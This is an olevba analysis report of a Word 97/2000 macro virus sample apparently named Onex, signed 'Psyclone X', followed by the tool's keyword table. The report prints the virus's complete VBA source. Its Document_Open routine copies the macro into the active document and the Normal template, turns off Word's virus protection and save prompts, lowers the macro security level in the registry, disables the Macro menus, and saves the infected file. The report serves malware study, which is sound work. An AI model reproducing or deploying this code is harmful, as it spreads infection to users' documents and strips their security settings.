olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex-8562b42e0383164c23740fd7e878964281ecda82
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Extra.cls 
in file: Virus.MSWord.Onex-8562b42e0383164c23740fd7e878964281ecda82 - OLE stream: 'Macros/VBA/Extra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
 On Error Resume Next
 Set c = New DataObject
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
   ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
   c.SetText Extra.VBProject.VBComponents(1).CodeModule.lines(1, Extra.VBProject.VBComponents(1).CodeModule.countoflines)
   .CodeModule.deletelines 1, .CodeModule.countoflines
   .CodeModule.insertlines 1, c.GetText
   .Name = "Extra"
  End With
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
' Word 97/2k.Extra - Psyclone X
' My first virus for the year 2k
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

